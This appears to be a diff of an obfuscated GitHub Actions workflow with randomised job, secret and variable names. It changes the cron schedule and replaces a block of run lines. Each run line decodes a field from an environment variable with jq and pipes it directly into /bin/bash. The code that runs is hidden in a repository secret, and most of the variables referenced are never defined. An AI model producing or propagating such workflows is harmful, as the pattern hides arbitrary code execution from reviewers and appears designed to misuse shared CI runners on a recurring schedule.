@@ -1,10 +1,8 @@
 name: pengqi19871010
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '4 2/6 * * *'
-
+    - cron: '46 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,19 +10,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: pengqi19871010
         env:
-          aeuo2149: ${{ secrets.aeuo2149 }}
+          kloip1778: ${{ secrets.kloip1778 }}
         run: |
-          echo $aeuo2149 | jq -r .mmy887 | /bin/bash
-          echo $zpr30 | jq -r .rscq3 | /bin/bash
-          echo $bh08350 | jq -r .z43698 | /bin/bash
-          echo $ldgpx9 | jq -r .wbojd4438 | /bin/bash
-          echo $obqiy1198 | jq -r .kuo4 | /bin/bash
-          echo $kau83 | jq -r .pnihl0 | /bin/bash
-          echo $k7132 | jq -r .jw125 | /bin/bash
-          echo $gqapj0976 | jq -r .kgoc98 | /bin/bash
-          echo $gor04 | jq -r .mgv22 | /bin/bash
-          echo $szlq45 | jq -r .swp40 | /bin/bash
-          echo $lzgyi15 | jq -r .djthe9699 | /bin/bash
-          echo $l868 | jq -r .clh9905 | /bin/bash
-          echo $xi7 | jq -r .fq8572 | /bin/bash
+          echo $kloip1778 | jq -r .n81 | /bin/bash
+          echo $ngx69 | jq -r .o1382 | /bin/bash
+          echo $armd15 | jq -r .eyf62 | /bin/bash
+          echo $gtbp0910 | jq -r .s41 | /bin/bash
+          echo $od3559 | jq -r .pum78 | /bin/bash
+          echo $ewqg30 | jq -r .nepuz57096 | /bin/bash
+          echo $moop38784 | jq -r .vrx45 | /bin/bash
+          echo $xygi0 | jq -r .t50317 | /bin/bash
+          echo $bpdv12516 | jq -r .a64 | /bin/bash
+          echo $cg075 | jq -r .wglai02281 | /bin/bash
+          echo $rvx1453 | jq -r .w330 | /bin/bash
 
